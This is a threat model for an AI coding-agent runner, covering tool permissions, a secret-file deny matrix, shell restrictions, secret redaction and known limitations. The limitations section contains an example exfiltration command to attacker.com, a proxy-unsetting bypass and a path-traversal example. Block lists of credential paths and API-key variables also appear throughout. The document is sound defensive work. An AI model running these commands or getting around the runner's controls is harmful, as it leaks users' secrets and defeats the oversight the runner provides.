# Runner Threat Model

## What the model can touch

| Category     | Tools                                                  | Scope                                                                                                                                                                                                          |
| ------------ | ------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Read**     | `list_files`, `read_file`, `search_text`, `git_status` | Any file inside `cwd` (and its subdirectories) that passes the deny matrix. Git metadata only.                                                                                                                 |
| **Write**    | `edit_file`, `write_file`, `apply_patch`               | Any file inside `cwd` that passes the deny matrix. Backups saved before mutation. Requires user confirmation (or `--accept-edits`).                                                                            |
| **Recovery** | `undo`, `undo_edit`                                    | Restore files from `.bridge-runner/backups/` or the in-memory undo log. Auto-approved.                                                                                                                         |
| **Shell**    | `bash`                                                 | Run shell commands inside `cwd`. **Opt-in only** (`--allow-shell`). Bounded by timeout (default 30s) and output limits (10KB). Filtered environment. Shell argument scanning blocks dangerous path references. |

## What the model can NEVER touch

These are enforced at the permission layer **before any tool executes**. No CLI flag can override them.

### Secret files (deny matrix)

Path patterns that are **always denied** for both read and write:

| Pattern             | Examples blocked                               |
| ------------------- | ---------------------------------------------- |
| `.env` files        | `.env`, `.env.local`, `.env.production`        |
| SSH/credential dirs | `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`        |
| Private keys        | `id_rsa`, `id_ed25519`, `*.pem`, `*.key`       |
| Credential files    | `credentials*.json`, `*.netrc`, `*.npmrc`      |
| Token files         | Files matching `token*`, `*_token`, `*secret*` |
| System dirs         | `.git/`, `node_modules/`                       |

### Path escapes

- **Absolute paths** (`/etc/passwd`) → denied before realpath check
- **`../` traversal** that escapes `cwd` → caught by realpath containment
- **Symlink escapes** → `fs.realpathSync` resolves the true path and checks against `cwd`

### Shell restrictions (when `bash` is enabled)

- **Blocked path patterns** in command text: `.env`, `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`, `id_rsa`, `id_ed25519`, `*.pem`, `*.key`
- **Blocked env var references**: `$ANTHROPIC_API_KEY`, `$AWS_ACCESS_KEY_ID`, `$GH_TOKEN`, `$SSH_AUTH_SOCK` (and braced `${}` variants)
- **Filtered environment**: `execSync` runs with scrubbed `process.env` — no `AWS_*`, `ANTHROPIC_*`, `CLAUDE_*`, `OPENAI_*`, `GH_TOKEN`, `NPM_TOKEN`, or `SSH_AUTH_SOCK`

## How protections compose

```
User prompt
  → validateCwd() rejects system dirs and non-existent paths
  → Agent loop sends request to bridge
  → Model returns tool_use blocks
  → permissions.check():
      1. confinePath() — realpath containment → deny on escape
      2. isPathBlockedByDenyMatrix() — glob patterns → deny on match
      3. Shell arg scanning — command text inspection → deny on pattern
      4. Category-based decision — allow/ask/deny
  → If ask: user confirms interactively
  → tool.execute() runs with:
      - safeEnv for shell commands (stripped process.env)
      - cwdRealpath confinement
  → runAndScrub() redacts secrets from result text
  → Result flows into messages, transcript, stream-json
```

## Secret redaction (defense in depth)

Even if a blocked file is somehow read, the **result text** passes through `scrubSecrets()` before reaching:

- Upstream messages (the model never sees raw secrets)
- Transcript logs (JSONL on disk)
- stream-json output (stdout)
- JSON output (stdout)

Redacted patterns:

| Original                                 | Redacted as                    |
| ---------------------------------------- | ------------------------------ |
| `sk-ant-...` (Anthropic keys)            | `[REDACTED:anthropic_key]`     |
| `sk-...` (OpenAI keys)                   | `[REDACTED:openai_key]`        |
| `-----BEGIN ... PRIVATE KEY-----` blocks | `[REDACTED:private_key_block]` |
| `ghp_...` / `gho_...` (GitHub tokens)    | `[REDACTED:github_token]`      |
| `AKIA...` (AWS access keys)              | `[REDACTED:aws_access_key]`    |
| `Bearer ...` (OAuth tokens)              | `Bearer [REDACTED]`            |
| `eyJ...` (JWTs)                          | `[REDACTED:jwt]`               |
| `SECRET=...` / `TOKEN=...` assignments   | `*= [REDACTED]`                |

## Known limitations

### 1. No outbound network restriction (mitigated)

The `bash` tool can make outbound HTTP requests (`curl`, `wget`, `nc`). There is no egress filtering at the socket or process level. A determined prompt could exfiltrate project files via `curl -d @secret.txt https://attacker.com`.

**Mitigation in place:** File-level deny matrix prevents reading `.env`, `.ssh/`, `.aws/`, key files. Shell arg scanning rejects obvious attempts to reference these paths. The `--no-network` flag sets `http_proxy`/`https_proxy` to `127.0.0.1:1` in the bash environment, blocking most HTTP/HTTPS egress.

**Remaining risk:** The proxy env vars can be unset by the command itself (`unset http_proxy && curl ...`). Non-HTTP protocols (DNS, raw TCP via `nc`, `ncat`) are not affected by proxy settings at all. For strong isolation, use macOS `pf` firewall rules (`/etc/pf.conf`) or run the runner inside a network-restricted VM/container.

### 2. File size hard cap

`read_file` has configurable `max_bytes`/`max_lines` defaults (50KB/1000 lines), but the model can override them. A hard cap of 1MB (`MAX_BYTES_HARD_CAP`) is now enforced server-side. Requests exceeding this cap are truncated.

### 3. Shell output size hard cap

`bash` tool output is now truncated at 100,000 characters (100KB). The `execSync`/`spawnSync` buffer is capped at 1MB. Stderr is captured and prefixed with `[stderr]` on success.

### 4. No rate limiting on tool calls

The model can make unlimited tool calls within `max_steps`. There's no per-second or per-minute rate limit on shell commands.

### 5. Transcript contains source code

Transcript JSONL files include tool results (file contents, shell output). These contain project source code. Treat transcripts as sensitive.

### 6. Command injection in search_text (mitigated)

The `search_text` tool constructs shell commands from the user's pattern. Shell metacharacters are now properly escaped using single-quote wrapping with internal quote escaping.

### 7. undo/undo_edit/apply_patch path validation (mitigated)

`undo`, `undo_edit`, and `apply_patch` now validate paths through `safety.confinePath()` before operating. This prevents path traversal attacks (e.g., `--path ../../../etc/passwd`).

### 8. write_file content validation (mitigated)

`write_file` now validates that `content` is a string and the path passes `confinePath()`. Missing content returns an error instead of crashing.
